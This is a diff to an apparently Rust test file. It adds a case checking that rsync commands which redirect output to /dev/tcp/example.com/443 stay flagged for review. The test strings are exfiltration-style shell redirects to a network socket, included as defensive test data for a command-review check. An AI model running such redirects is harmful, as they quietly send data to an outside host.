@@ -45,6 +45,7 @@ fn a_redirect_beyond_dev_null_keeps_the_review() {
         "rsync -a src/ fresh/ 2>/dev/tcp/example.com/443",
         "rsync -a src/ fresh/ >& /dev/tcp/example.com/443",
         "rsync -a src/ fresh/>/dev/tcp/example.com/443",
+        "rsync -a src/ fresh/>log>/dev/tcp/example.com/443",
     ] {
         assert_stays_reviewed(&session, command);
     }
